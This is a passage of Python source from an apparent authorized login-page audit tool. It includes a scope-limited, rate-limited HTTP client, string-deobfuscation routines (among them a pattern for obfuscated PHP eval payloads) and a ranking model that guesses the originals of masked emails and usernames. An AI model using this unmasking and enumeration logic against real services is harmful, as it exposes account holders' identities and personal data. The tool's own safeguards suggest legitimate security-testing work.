            cc = COUNTRY_CODES[hint.upper()]
            if s.startswith("0") and len(s) > 1:
                s = s[1:]
            return cc + s
        if hint.startswith("+"):
            return hint + s
    return None


def country_code_prompt_value(v: str) -> str:
    v = v.strip()
    if not v:
        return ""
    if v.upper() in COUNTRY_CODES:
        return v.upper()
    if v.startswith("+"):
        return v
    return v.upper()


def detect_env_from_url(url: str) -> str:
    u = url.lower()
    if any(s in u for s in ("localhost", "127.0.0.1", ".lab.",
                             ".internal", ".local")):
        return "lab"
    if any(s in u for s in ("staging", "stage", ".test.", "dev.", "qa.")):
        return "staging"
    return "prod"


def classify_id_shape(value: str) -> str:
    s = str(value).strip()
    if not s:
        return "unknown"
    has_digit = any(c.isdigit() for c in s)
    has_alpha = any(c.isalpha() for c in s)
    if has_digit and has_alpha:
        return "mixed"
    if has_digit:
        return "numeric"
    if has_alpha:
        return "alpha"
    return "other"


@dataclass
class Identifier:
    raw: str
    type: str
    normalized: str
    country_hint: str = ""
    e164: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "type": self.type,
            "raw_len": len(self.raw),
            "raw_sha256_16": hashlib.sha256(
                self.raw.encode()).hexdigest()[:16],
            "normalized_sha256_16": hashlib.sha256(
                self.normalized.encode()).hexdigest()[:16],
            "e164": self.e164,
            "country_hint": self.country_hint,
        }


def make_identifier(raw: str, country_hint: str = "") -> Identifier:
    s = raw.strip()
    if not s:
        raise IdentifierError("empty identifier")
    t = detect_identifier_type(s)
    if t == "email":
        return Identifier(raw=s, type="email",
                          normalized=s.lower(), country_hint=country_hint)
    if t == "phone":
        e164 = normalize_phone(s, country_hint)
        return Identifier(raw=s, type="phone",
                          normalized=e164 or s, e164=e164,
                          country_hint=country_hint)
    return Identifier(raw=s, type="username",
                      normalized=s.lower(), country_hint=country_hint)


def identifier_field_name(identifier: Identifier,
                           openapi: Optional[dict],
                           override: str = "") -> str:
    if override:
        return override
    if openapi:
        uf, _ = discover_login_fields(openapi)
        if uf:
            if identifier.type == "email" and "mail" in uf.lower():
                return uf
            if identifier.type == "phone" and any(
                    k in uf.lower() for k in ("phone", "mobile", "tel",
                                              "msisdn")):
                return uf
            if identifier.type == "username" and "user" in uf.lower():
                return uf
    if identifier.type == "phone":
        return "phone"
    if identifier.type == "email":
        return "email"
    return "username"


class JsonLogger:
    def __init__(self, quiet: bool = False, verbose: bool = True,
                 color: bool = True, stream=sys.stderr):
        self.quiet = quiet
        self.verbose = verbose
        self.color = color and self._tty(stream)
        self.stream = stream
        self.lines: List[Dict[str, Any]] = []

    @staticmethod
    def _tty(stream) -> bool:
        try:
            return stream.isatty()
        except Exception:
            return False

    def _c(self, code: str, text: str) -> str:
        if not self.color:
            return text
        return f"\033[{code}m{text}\033[0m"

    def log(self, event: str, level: str = "normal", **kwargs) -> None:
        rec = {"ts": utcnow(), "event": event, "level": level, **kwargs}
        self.lines.append(rec)
        if level == "verbose" and not self.verbose:
            return
        if level == "quiet" and self.quiet:
            return
        if self.quiet and level != "error":
            return
        msg = kwargs.get("msg", "")
        if not msg:
            return
        colour = {
            "error": "31", "warn": "33", "stop": "31",
            "done": "32", "saved": "36", "finding": "34",
            "enum_finding": "35", "http": "90",
            "guard_triggered": "31", "auth_refused": "31",
            "auth_failed": "31", "scope_violation": "31",
            "enum_probe": "90", "field": "34",
            "client_side": "92", "js_pass": "92", "html": "92",
            "script": "92", "instrument": "36", "pause": "36",
            "skimmer": "35", "phishing": "35", "client_fetch": "92",
            "target": "96", "recon": "96", "login_probe": "96",
            "forgot_probe": "96", "deobf": "93",
        }.get(event, "0")
        if colour == "0":
            print(f"[{event}] {msg}", file=self.stream)
        else:
            print(self._c(colour, f"[{event}] {msg}"), file=self.stream)

    def dump(self) -> List[Dict[str, Any]]:
        return list(self.lines)

    def sha256(self) -> str:
        blob = json.dumps(self.lines, sort_keys=True, ensure_ascii=False)
        return hashlib.sha256(blob.encode("utf-8")).hexdigest()


LOG = JsonLogger()


class _SafeResponse:
    __slots__ = ("_orig", "_body", "status_code", "headers", "url",
                 "reason", "encoding")

    def __init__(self, orig, body: bytes):
        self._orig = orig
        self._body = body
        self.status_code = orig.status_code
        self.headers = dict(orig.headers)
        self.url = orig.url
        self.reason = getattr(orig, "reason", "") or ""
        self.encoding = getattr(orig, "encoding", None) or "utf-8"

    @property
    def content(self) -> bytes:
        return self._body

    @property
    def text(self) -> str:
        try:
            return self._body.decode(self.encoding, errors="replace")
        except (LookupError, UnicodeDecodeError):
            return self._body.decode("utf-8", errors="replace")

    @property
    def ok(self) -> bool:
        return 200 <= self.status_code < 400

    @property
    def is_redirect(self) -> bool:
        return 300 <= self.status_code < 400 and "location" in self.headers

    @property
    def cookies(self):
        return getattr(self._orig, "cookies", None)

    @property
    def history(self):
        return getattr(self._orig, "history", [])

    @property
    def elapsed(self):
        return getattr(self._orig, "elapsed", None)

    @property
    def raw(self):
        return None

    def iter_content(self, chunk_size: int = 1, decode_unicode: bool = False):
        if self._body:
            yield self._body

    def json(self, **kw):
        return json.loads(self.text, **kw)

    def close(self) -> None:
        try:
            self._orig.close()
        except Exception:
            pass

    def raise_for_status(self):
        if 400 <= self.status_code < 600:
            raise requests.HTTPError(
                f"{self.status_code} response from "
                f"{redact_url_for_log(self.url)}")


class AuthorizedClient:
    def __init__(
        self,
        base_url: str,
        requests_per_second: float = 0.5,
        timeout: int = 20,
        verify_tls: bool = True,
        authorized: bool = False,
        auth_headers: Optional[Dict[str, str]] = None,
        allowed_hosts: Optional[Sequence[str]] = None,
        max_requests: int = 500,
        max_response_bytes: int = 20 * 1024 * 1024,
        guard_tolerance: int = 1,
        retries: int = 2,
        pool_maxsize: int = 4,
        discovery_reserve: int = 20,
    ):
        if requests_per_second <= 0:
            raise ValueError("requests_per_second must be > 0")
        if not authorized:
            raise AuthorizationRequiredError(
                "Authorized testing flag required for network calls.")
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.delay = 1.0 / requests_per_second
        self.last_request_time = 0.0
        self.request_count = 0
        self.guard_tolerance = max(1, guard_tolerance)
        self.guard_hits: List[Dict[str, Any]] = []
        self.soft_guard_count = 0
        self.hard_guard_count = 0
        self.max_requests = max_requests
        self.max_response_bytes = max_response_bytes
        self.discovery_reserve = min(discovery_reserve, max_requests // 3)
        self.authorized = authorized
        self.allowed_hosts: set = set()
        for h in (allowed_hosts or []):
            self.allowed_hosts.add(h.lower())
        if not self.allowed_hosts:
            self.allowed_hosts.add(urlparse(self.base_url).netloc.lower())

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": self._user_agent(),
            "Accept": "application/json, text/html;q=0.9,"
                      "application/javascript;q=0.8,*/*;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Lab-Authorized-Testing": "true",
            "X-ZephyrOS-Audit": "true",
        })
        if auth_headers:
            self.session.headers.update(auth_headers)

        retry = Retry(
            total=retries, connect=retries, read=retries, status=0,
            backoff_factor=0.5, backoff_jitter=0.25,
            allowed_methods=frozenset({"GET", "HEAD", "OPTIONS"}),
            raise_on_status=False)
        adapter = HTTPAdapter(max_retries=retry, pool_maxsize=pool_maxsize)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    @staticmethod
    def _user_agent() -> str:
        return (f"ZephyrOSLab/{VERSION} "
                "(+authorized-login-page-audit; "
                f"ZephyrOS by {ZEPHYR_AUTHOR})")

    def absolute_url(self, path_or_url: str) -> str:
        return urljoin(self.base_url, path_or_url)

    def _check_scope(self, url: str) -> None:
        host = urlparse(url).netloc.lower()
        if not host:
            raise ScopeViolationError(f"Invalid URL: {url}")
        if self.allowed_hosts and host not in self.allowed_hosts:
            raise ScopeViolationError(
                f"Host {host} not in allowed hosts "
                f"({sorted(self.allowed_hosts)}).")

    def _throttle(self, soft: bool = False) -> None:
        limit = self.max_requests
        if soft:
            limit = max(1, self.max_requests - self.discovery_reserve)
        if self.request_count >= limit:
            raise ScopeViolationError(
                f"Request budget reached (soft={soft}, limit={limit}).")
        elapsed = time.time() - self.last_request_time
        remaining = self.delay - elapsed
        if remaining > 0:
            time.sleep(remaining)
        self.last_request_time = time.time()

    def _check_guard(self, response: _SafeResponse, url: str,
                     soft: bool = False,
                     allow_statuses: Sequence[int] = ()) -> None:
        if response.status_code in allow_statuses:
            return
        if response.status_code not in (401, 403, 429):
            return
        self.guard_hits.append({
            "ts": utcnow(), "url": redact_url_for_log(url),
            "status": response.status_code, "soft": soft})
        if soft:
            self.soft_guard_count += 1
            return
        self.hard_guard_count += 1
        if self.hard_guard_count >= self.guard_tolerance:
            LOG.log("guard_triggered",
                    msg=(f"HTTP {response.status_code} at "
                         f"{redact_url_for_log(url)}; "
                         f"guard tolerance {self.guard_tolerance} reached."),
                    url=redact_url_for_log(url),
                    status=response.status_code)
            raise GuardTriggeredError(
                f"Protection triggered at {redact_url_for_log(url)}: "
                f"HTTP {response.status_code}.")

    def _request(self, method: str, path_or_url: str,
                 soft: bool = False,
                 allow_statuses: Sequence[int] = (),
                 **kwargs) -> _SafeResponse:
        url = self.absolute_url(path_or_url)
        self._check_scope(url)
        self._throttle(soft=soft)
        LOG.log("http", level="verbose",
                msg=f"{method} {redact_url_for_log(url)}",
                method=method, url=redact_url_for_log(url))
        try:
            response = self.session.request(
                method, url, timeout=self.timeout,
                verify=self.verify_tls, stream=True, **kwargs)
        except requests.exceptions.RequestException as e:
            raise LabToolError(f"request failed: {type(e).__name__}: {e}")
        self.request_count += 1
        body = bytearray()
        try:
            for chunk in response.iter_content(chunk_size=8192):
                body.extend(chunk)
                if len(body) > self.max_response_bytes:
                    raise LabToolError(
                        f"Response exceeded {self.max_response_bytes} bytes "
                        f"at {redact_url_for_log(url)}.")
        except requests.exceptions.ChunkedEncodingError as e:
            response.close()
            raise LabToolError(
                f"chunked encoding error at "
                f"{redact_url_for_log(url)}: {e}")
        except requests.exceptions.RequestException as e:
            response.close()
            raise LabToolError(
                f"stream error at {redact_url_for_log(url)}: {e}")
        except Exception:
            response.close()
            raise
        safe = _SafeResponse(response, bytes(body))
        LOG.log("http", level="verbose",
                msg=f"  -> {safe.status_code} ({len(body)} bytes)",
                method=method, url=redact_url_for_log(url),
                status=safe.status_code, size=len(body))
        self._check_guard(safe, url, soft=soft,
                          allow_statuses=allow_statuses)
        return safe

    def get(self, path_or_url: str, allow_redirects: bool = True,
            soft: bool = False,
            allow_statuses: Sequence[int] = ()) -> _SafeResponse:
        return self._request("GET", path_or_url, soft=soft,
                             allow_redirects=allow_redirects,
                             allow_statuses=allow_statuses)

    def get_soft(self, path_or_url: str,
                 allow_redirects: bool = True) -> Optional[_SafeResponse]:
        try:
            return self._request("GET", path_or_url, soft=True,
                                 allow_redirects=allow_redirects)
        except (GuardTriggeredError, ScopeViolationError, LabToolError):
            return None

    def post_json(self, path_or_url: str, payload: dict,
                  allow_redirects: bool = False,
                  soft: bool = False,
                  allow_statuses: Sequence[int] = ()) -> _SafeResponse:
        return self._request("POST", path_or_url, soft=soft,
                             json=payload,
                             allow_redirects=allow_redirects,
                             allow_statuses=allow_statuses)

    def post_json_soft(self, path_or_url: str, payload: dict
                       ) -> Optional[_SafeResponse]:
        try:
            return self._request("POST", path_or_url, soft=True,
                                 json=payload, allow_redirects=False)
        except (GuardTriggeredError, ScopeViolationError, LabToolError):
            return None

    def head(self, path_or_url: str, soft: bool = False) -> _SafeResponse:
        return self._request("HEAD", path_or_url, soft=soft)

def _decode_bytes(raw: bytes, label: str
                  ) -> Optional[Tuple[str, str]]:
    for enc in ("utf-8", "utf-16", "latin-1"):
        try:
            decoded = raw.decode(enc)
        except (UnicodeDecodeError, ValueError):
            continue
        if printable_ratio(decoded) >= 0.75:
            return label, decoded
    return None


def try_url(v: str):
    if "%" not in v:
        return None
    d = urllib.parse.unquote(v)
    return ("URL-encoded", d) if d != v else None


def try_base64(v: str):
    cleaned = re.sub(r"\s+", "", v)
    if len(cleaned) < 8 or not re.fullmatch(r"[A-Za-z0-9+/=_-]+", cleaned):
        return None
    padded = cleaned.replace("-", "+").replace("_", "/")
    padded += "=" * ((4 - len(padded) % 4) % 4)
    try:
        raw = base64.b64decode(padded, validate=True)
    except (binascii.Error, ValueError):
        return None
    return _decode_bytes(raw, "Base64")


def try_base32(v: str):
    cleaned = re.sub(r"\s+", "", v).rstrip("=")
    if len(cleaned) < 8 or not re.fullmatch(r"[A-Z2-7]+", cleaned):
        return None
    try:
        raw = base64.b32decode(cleaned + "=" * ((8 - len(cleaned) % 8) % 8))
    except (binascii.Error, ValueError):
        return None
    return _decode_bytes(raw, "Base32")


def try_hex(v: str):
    cleaned = re.sub(r"(?i)0x|\s|,", "", v)
    if (len(cleaned) < 4 or len(cleaned) % 2 != 0
            or not re.fullmatch(r"[0-9a-fA-F]+", cleaned)):
        return None
    try:
        raw = binascii.unhexlify(cleaned)
    except (binascii.Error, ValueError):
        return None
    return _decode_bytes(raw, "Hex")


def try_rot13(v: str):
    d = codecs.decode(v, "rot_13")
    return ("ROT13", d) if d != v else None


def _caesar_score(text: str) -> float:
    words = re.findall(r"[a-z]+", text.lower())
    if not words:
        return 0.0
    known = sum(1 for w in words if w in BASE_DICTIONARY
                or w in COMMON_WORDS)
    ratio = known / len(words)
    return ratio * 10.0 + printable_ratio(text)


def try_caesar(v: str):
    if sum(c.isalpha() for c in v) < 4:
        return None
    best, best_score = None, 0.0
    for shift in range(1, 26):
        out = []
        for c in v:
            if c.isalpha():
                ab = (string.ascii_lowercase if c.islower()
                      else string.ascii_uppercase)
                out.append(ab[(ab.index(c) - shift) % 26])
            else:
                out.append(c)
        cand = "".join(out)
        score = _caesar_score(cand)
        if score >= 7.0 and score > best_score:
            best_score = score
            best = (f"Caesar shift -{shift}", cand)
    return best


def try_reverse(v: str):
    d = v[::-1]
    return ("Reversed", d) if d != v else None


DECODERS = [try_url, try_base64, try_base32, try_hex,
            try_rot13, try_caesar, try_reverse]


def decode_js_escapes(s: str) -> str:
    def _h(m):
        try:
            return chr(int(m.group(1), 16))
        except (ValueError, OverflowError):
            return m.group(0)

    def _o(m):
        try:
            return chr(int(m.group(1), 8))
        except (ValueError, OverflowError):
            return m.group(0)

    s = UNICODE_ESCAPE_RE.sub(_h, s)
    s = HEX_ESCAPE_RE.sub(_h, s)
    s = OCTAL_ESCAPE_RE.sub(_o, s)
    s = JS_ESCAPE_SEQ.sub(
        lambda m: JS_ESCAPE_MAP.get(m.group(1), m.group(0)), s)
    return s


def decode_html_entities(s: str) -> str:
    s = HTML_ENTITY_RE.sub(
        lambda m: chr(int(m.group(1), 16)) if m.group(1)
        else chr(int(m.group(2))), s)
    try:
        return _html_mod.unescape(s)
    except Exception:
        return s


def decode_atbash(s: str) -> str:
    out = []
    for c in s:
        if c.isalpha():
            base = ord("a") if c.islower() else ord("A")
            out.append(chr(base + (25 - (ord(c) - base))))
        else:
            out.append(c)
    return "".join(out)


def decode_php_gzinflate_base64(s: str) -> Optional[str]:
    m = re.search(
        r"eval\s*\(\s*gzinflate\s*\(\s*base64_decode\s*\(\s*"
        r"['\"]([A-Za-z0-9+/=]+)['\"]\s*\)\s*\)\s*\)", s)
    if not m:
        return None
    try:
        raw = base64.b64decode(m.group(1))
        try:
            return zlib.decompress(raw, -15).decode(
                "utf-8", errors="replace")
        except zlib.error:
            return zlib.decompress(raw).decode("utf-8", errors="replace")
    except (binascii.Error, zlib.error, ValueError):
        return None


def decode_php_str_rot(s: str) -> Optional[str]:
    m = re.search(r"(str_rot13|base64_decode|urldecode)\s*\(\s*"
                  r"['\"]([^'\"]+)['\"]\s*\)", s)
    if not m:
        return None
    fn, arg = m.group(1), m.group(2)
    if fn == "str_rot13":
        return codecs.decode(arg, "rot_13")
    if fn == "base64_decode":
        r = try_base64(arg)
        return r[1] if r else None
    if fn == "urldecode":
        return urllib.parse.unquote(arg)
    return None


class StringCascade:
    def __init__(self, passes: int = 15):
        self.passes = passes
        self.trail: List[str] = []

    def decode(self, s: str) -> Tuple[str, List[str]]:
        self.trail = []
        prev = None
        cur = s
        for _ in range(self.passes):
            if cur == prev:
                break
            prev = cur
            if "\\u" in cur or "\\x" in cur or re.search(r"\\[0-7]", cur):
                nxt = decode_js_escapes(cur)
                if nxt != cur:
                    self.trail.append("js-escape")
                    cur = nxt
                    continue
            if "&#" in cur:
                nxt = decode_html_entities(cur)
                if nxt != cur:
                    self.trail.append("html-entity")
                    cur = nxt
                    continue
            if "%" in cur:
                nxt = urllib.parse.unquote(cur, errors="replace")
                if nxt != cur:
                    self.trail.append("url")
                    cur = nxt
                    continue
            if "gzinflate" in cur and "base64_decode" in cur:
                nxt = decode_php_gzinflate_base64(cur)
                if nxt and nxt != cur:
                    self.trail.append("php-gzinflate-base64")
                    cur = nxt
                    continue
            if ("str_rot13" in cur or "base64_decode" in cur
                    or "urldecode" in cur):
                nxt = decode_php_str_rot(cur)
                if nxt and nxt != cur:
                    self.trail.append("php-str-wrap")
                    cur = nxt
                    continue
            if len(cur) > 8 and " " not in cur[:40]:
                r = try_base64(cur)
                if r and r[1] != cur and printable_ratio(r[1]) > 0.85:
                    self.trail.append("base64")
                    cur = r[1]
                    continue
            if len(cur) > 8 and " " not in cur[:40]:
                r = try_base32(cur)
                if r and r[1] != cur and printable_ratio(r[1]) > 0.85:
                    self.trail.append("base32")
                    cur = r[1]
                    continue
            if len(cur) > 8 and " " not in cur[:40]:
                r = try_hex(cur)
                if r and r[1] != cur and printable_ratio(r[1]) > 0.85:
                    self.trail.append("hex")
                    cur = r[1]
                    continue
        return cur, self.trail


@dataclass
class DecodeChain:
    method: str
    value: str

    def to_dict(self):
        return {"method": self.method, "value": self.value}


def recursive_decode(value: str, max_depth: int = 5
                     ) -> List[List[DecodeChain]]:
    chains: List[List[DecodeChain]] = []

    def dfs(current: str, chain: List[DecodeChain],
            visited: set, depth: int):
        if depth > 0:
            chains.append(list(chain))
        if depth >= max_depth:
            return
        for decoder in DECODERS:
            res = decoder(current)
            if not res:
                continue
            label, decoded = res
            if decoded in visited:
                continue
            chain.append(DecodeChain(label, decoded))
            visited.add(decoded)
            dfs(decoded, chain, visited, depth + 1)
            visited.remove(decoded)
            chain.pop()

    dfs(value, [], {value}, 0)
    return chains


class IDChecksum:
    @staticmethod
    def luhn(number: str) -> bool:
        digits = [int(c) for c in re.sub(r"\D", "", number)]
        if len(digits) < 2:
            return False
        total = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        return total % 10 == 0

    @staticmethod
    def iban(number: str) -> bool:
        s = re.sub(r"\s+", "", number).upper()
        if len(s) < 15 or not re.fullmatch(r"[A-Z0-9]+", s):
            return False
        rearranged = s[4:] + s[:4]
        digits = "".join(str(ord(c) - 55) if c.isalpha() else c
                         for c in rearranged)
        try:
            return int(digits) % 97 == 1
        except ValueError:
            return False


@dataclass
class CandidateModel:
    word_priors: Dict[str, float] = field(
        default_factory=lambda: dict(DEFAULT_WORD_PRIORS))
    dictionary: set = field(
        default_factory=lambda: set(BASE_DICTIONARY))
    default_prior: float = 0.5
    email_length_priors: Dict[str, Tuple[float, float]] = field(
        default_factory=lambda: dict(EMAIL_DOMAIN_LENGTH_PRIORS))

    def _alignment_score(self, candidate: str, masked: str) -> float:
        c_len, m_len = len(candidate), len(masked)
        if c_len == m_len:
            score = 0.0
            for cc, mc in zip(candidate, masked):
                if mc in MASK_SYMBOLS:
                    score += 0.0
                elif cc == mc:
                    score += 0.15
                else:
                    score -= 5.0
            return score
        c_prefix = 0
        for cc, mc in zip(candidate, masked):
            if mc in MASK_SYMBOLS:
                break
            if cc != mc:
                return -10.0
            c_prefix += 1
        c_suffix = 0
        for cc, mc in zip(reversed(candidate), reversed(masked)):
            if mc in MASK_SYMBOLS:
                break
            if cc != mc:
                return -10.0
            c_suffix += 1
        if c_prefix + c_suffix > min(c_len, m_len):
            return -10.0
        score = (c_prefix + c_suffix) * 0.15
        c_middle = c_len - c_prefix - c_suffix
        m_end = m_len - c_suffix if c_suffix else m_len
        m_middle_segment = masked[c_prefix:m_end]
        m_middle_len = len(m_middle_segment)
        if c_middle < 0 or m_middle_len < 0:
            return -10.0
        fixed_width_middle = (
            len(m_middle_segment) > 0
            and len(set(m_middle_segment)) == 1
            and m_middle_segment[0] in MASK_SYMBOLS)
        if fixed_width_middle:
            score -= 0.05 * abs(c_middle - m_middle_len)
        else:
            score -= 0.5 * abs(c_middle - m_middle_len)
        return score

    def _prior(self, candidate: str, field_type: str = "") -> float:
        c = candidate.lower()
        if field_type == "email" and "@" in c:
            local, domain = c.split("@", 1)
            if domain in self.email_length_priors:
                mu, sigma = self.email_length_priors[domain]
                mu = max(mu, 1.0)
                sigma = max(sigma, 1.0)
                z = (len(local) - mu) / sigma
                length_prior = math.exp(-0.5 * z * z) / (
                    sigma * math.sqrt(2 * math.pi))
                length_prior = max(length_prior, 1e-6)
            else:
                length_prior = 1.0 / (1 + len(local))
            if local in self.word_priors:
                return (math.log(self.word_priors[local])
                        + math.log(length_prior))
            if local in self.dictionary:
                return math.log(self.default_prior * length_prior)
            return math.log(self.default_prior * length_prior
                            / (1 + len(local)))
        if c in self.word_priors:
            return math.log(self.word_priors[c])
        if c in self.dictionary:
            return math.log(self.default_prior)
        return math.log(self.default_prior / (1 + len(c)))

    def rank(self, masked: str, candidates: Iterable[str],
             field_type: str = "") -> List[Tuple[float, str]]:
        scored: List[Tuple[float, str]] = []
        seen = set()
        for cand in candidates:
            cand = cand.strip()
            if not cand or cand in seen:
                continue
            seen.add(cand)
            ll = (self._alignment_score(cand, masked)
                  + self._prior(cand, field_type))
            scored.append((ll, cand))
        scored.sort(key=lambda t: t[0], reverse=True)
        return scored

    def interval(self, ranked: List[Tuple[float, str]]) -> Dict[str, Any]:
        if not ranked:
            return {"top": None, "confidence": 0.0, "ci": [0.0, 1.0]}
        logits = [s for s, _ in ranked[:20]]
        m = max(logits)
        probs = [math.exp(s - m) for s in logits]
        total = sum(probs) or 1.0
        probs = [p / total for p in probs]
        n = max(len(ranked), 1)
        se = math.sqrt(probs[0] * (1 - probs[0]) / n)
        return {
            "top": ranked[0][1],
            "confidence": round(probs[0], 4),
            "ci": [round(clamp(probs[0] - 1.96 * se), 4),
                   round(clamp(probs[0] + 1.96 * se), 4)],
        }


@dataclass
class AnalyzerResult:
    method_family: Literal["prefix_suffix", "multi_segment",
                            "format_aware", "learned_rule_bayesian"]
    confidence: float
    details: Dict[str, Any]
    candidates: List[str] = field(default_factory=list)
    ci: Optional[List[float]] = None

    def to_dict(self):
        return {
            "method_family": self.method_family,
            "confidence": round(self.confidence, 4),
            "ci": self.ci,
            "details": self.details,
            "candidates": self.candidates[:25],
        }


class MaskPatternAnalyzer:
    def __init__(self, dictionary: Optional[Iterable[str]] = None,
                 training_pairs: Optional[List[dict]] = None,
                 model: Optional[CandidateModel] = None):
        self.dictionary = set(dictionary or BASE_DICTIONARY)
        self.training_pairs = training_pairs or []
        self.model = model or CandidateModel(dictionary=self.dictionary)
        self.model.dictionary |= self.dictionary
        self.learned_rules: List[dict] = []
        for pair in self.training_pairs:
            self.learn(pair.get("original", ""), pair.get("masked", ""))

    def learn(self, original: str, masked: str) -> Optional[dict]:
        original, masked = original.strip(), masked.strip()
        if not original or not masked:
            return None
        matcher = difflib.SequenceMatcher(None, original, masked)
        blocks = matcher.get_matching_blocks()
        prefix, suffix = 0, 0
        if blocks:
            first, last = blocks[0], blocks[-1]
            if first.a == 0 and first.b == 0:
                prefix = first.size
            if (last.a + last.size == len(original)
                    and last.b + last.size == len(masked)):
                suffix = last.size
        mask_runs = [
            {"start": m.start(), "length": m.end() - m.start()}
            for m in MASK_RUN.finditer(masked)]
        fixed_width = (
            len(mask_runs) == 1
            and len(set(re.findall(MASK_RUN, masked))) == 1
            and len(set(c for c in masked if c in MASK_SYMBOLS)) == 1)
        rule = {
            "original": original, "masked": masked,
            "prefix_length": prefix, "suffix_length": suffix,
            "original_length": len(original),
            "masked_length": len(masked),
            "mask_runs": mask_runs, "fixed_width": fixed_width,
            "skeleton": mask_skeleton(masked),
        }
        self.learned_rules.append(rule)
        return rule

    @staticmethod
    def detect_value_type(masked: str, field_hint: str = "") -> str:
        if field_hint:
            for t, names in FIELD_TYPE_HINTS.items():
                if field_hint.lower() in names:
                    return t
        if re.fullmatch(r"[^@\s]+@[^@\s]+\.[A-Za-z]{2,}", masked):
            return "email"
        if re.fullmatch(
                rf"\+?\d[\d\-\s\(\)]*[{MASK_CHARS_CLASS}]+[\d\-\s\(\)]*",
                masked):
            return "phone"
        if re.fullmatch(rf"[A-Za-z]+[{MASK_CHARS_CLASS}]+[A-Za-z]+",
                        masked):
            return "name_or_word"
        if re.fullmatch(
                rf"[A-Za-z0-9_\-]+[{MASK_CHARS_CLASS}]+[A-Za-z0-9_\-]*",
                masked):
            return "username_or_id"
        return "unknown"

    def beginner_fixed_mask(self, masked: str
                            ) -> Optional[AnalyzerResult]:
        match = re.fullmatch(
            rf"([A-Za-z0-9]+)([{MASK_CHARS_CLASS}]+)([A-Za-z0-9]+)",
            masked)
        if not match:
            return None
        prefix, mask_part, suffix = match.groups()
        fixed_width = len(set(mask_part)) == 1
        return AnalyzerResult(
            method_family="prefix_suffix",
            confidence=0.45 if fixed_width else 0.55,
            details={
                "prefix": prefix, "suffix": suffix,
                "masked_symbol_count": len(mask_part),
                "mask_is_fixed_width": fixed_width,
                "length_reported": ("unknown_fixed_width" if fixed_width
                                    else "may_leak"),
                "leak_note": ("Fixed-width padding hides original length; "
                              "do not infer length from symbol count."
                              if fixed_width else
                              "Variable-width mask; length may leak."),
            })

    def intermediate_partial_mask(self, masked: str
                                   ) -> Optional[AnalyzerResult]:
        segments = re.split(rf"([{MASK_CHARS_CLASS}]+)", masked)
        visible = [s for s in segments
                   if s and not all(c in MASK_SYMBOLS for c in s)]
        mask_segs = [s for s in segments
                     if s and all(c in MASK_SYMBOLS for c in s)]
        if not mask_segs:
            return None
        return AnalyzerResult(
            method_family="multi_segment", confidence=0.60,
            details={
                "visible_segments": visible,
                "mask_segments": mask_segs,
                "mask_symbol_count": sum(len(s) for s in mask_segs),
                "mask_symbol_count_is_length": False,
            })

    def advanced_format_aware(self, masked: str,
                               known_plaintext: str = "",
                               field_hint: str = "") -> AnalyzerResult:
        vtype = self.detect_value_type(masked, field_hint)
        if vtype == "email" and "@" in masked:
            local_mask, domain = masked.split("@", 1)
            if has_mask(domain):
                core = re.sub(r"[^a-z0-9]", "", local_mask.lower())
                hidden = sum(local_mask.count(s) for s in MASK_SYMBOLS)
                target = len(core) + hidden
                pool = list(self.dictionary) + list(self.model.word_priors)
                candidates = []
                for w in pool:
                    w = w.strip().lower()
                    if not w or "@" in w:
                        continue
                    if target == 0 or len(w) == target:
                        candidates.append(w)
                if known_plaintext and "@" in known_plaintext:
                    candidates.insert(0, known_plaintext.split("@", 1)[0])
                uniq = list(dict.fromkeys(candidates))[:60]
                ranked = self.model.rank(local_mask, uniq,
                                         field_type="username")
                ci = self.model.interval(ranked)
                return AnalyzerResult(
                    method_family="format_aware",
                    confidence=ci["confidence"] if ranked else 0.25,
                    details={"detected_type": vtype,
                             "domain_masked": True,
                             "local_mask": local_mask,
                             "note": ("domain masked; local-part "
                                      "reconstruction only")},
                    candidates=[c for _, c in ranked[:25]],
                    ci=ci["ci"])
            domain_visible = domain
            pool = list(self.dictionary) + list(self.model.word_priors)
            candidates = []
            for w in pool:
                w = w.strip().lower()
                if not w or "@" in w:
                    continue
                candidates.append(f"{w}@{domain_visible}")
            if known_plaintext:
                candidates.insert(0, known_plaintext.strip())
            uniq = list(dict.fromkeys(candidates))[:60]
            ranked = self.model.rank(masked, uniq, field_type="email")
            ci = self.model.interval(ranked)
            return AnalyzerResult(
                method_family="format_aware",
                confidence=ci["confidence"] if ranked else 0.30,
                details={"detected_type": vtype,
                         "domain_masked": False,
                         "domain_visible": domain_visible,
                         "ranking": "P(mask|candidate) * P(candidate)"},
                candidates=[c for _, c in ranked[:25]],
                ci=ci["ci"])
        if vtype == "phone":
            visible_digits = re.sub(
                rf"[{MASK_CHARS_CLASS}\s\-\(\)]", "", masked)
            return AnalyzerResult(
                method_family="format_aware", confidence=0.30,
                details={"detected_type": vtype,
                         "visible_digit_count": len(visible_digits),
                         "note": ("phone reconstruction not feasible "
                                  "without a real number table")},
                candidates=[])
        if vtype in ("name_or_word", "username_or_id", "name"):
            core = re.sub(r"[^a-z0-9]", "", masked.lower())
            hidden = sum(masked.count(s) for s in MASK_SYMBOLS)
            target = len(core) + hidden
            candidates = []
            for w in self.dictionary:
                w = w.strip().lower()
                if len(w) == target and target > 0:
                    candidates.append(w)
            if known_plaintext:
                candidates.insert(0, known_plaintext.strip())
            uniq = list(dict.fromkeys(candidates))[:60]
            ranked = self.model.rank(masked, uniq, field_type="name")
            ci = self.model.interval(ranked)
            return AnalyzerResult(
                method_family="format_aware",
                confidence=ci["confidence"] if ranked else 0.30,
                details={"detected_type": vtype,
                         "ranking": "P(mask|candidate) * P(candidate)"},
                candidates=[c for _, c in ranked[:25]],
                ci=ci["ci"])
        return AnalyzerResult(
            method_family="format_aware", confidence=0.15,
            details={"detected_type": vtype,
                     "note": "type detection inconclusive"},
            candidates=[])

    def hyper_adaptive(self, masked: str, known_plaintext: str = "",
                       field_hint: str = ""
                       ) -> Optional[AnalyzerResult]:
        if not self.learned_rules:
            return None

        def skeleton_similarity(a: str, b: str) -> float:
            return difflib.SequenceMatcher(
                None, mask_skeleton(a), mask_skeleton(b)).ratio()

        scored_rules = sorted(
            ((skeleton_similarity(r["masked"], masked), r)
             for r in self.learned_rules),
            key=lambda t: t[0], reverse=True)
        if not scored_rules:
            return None
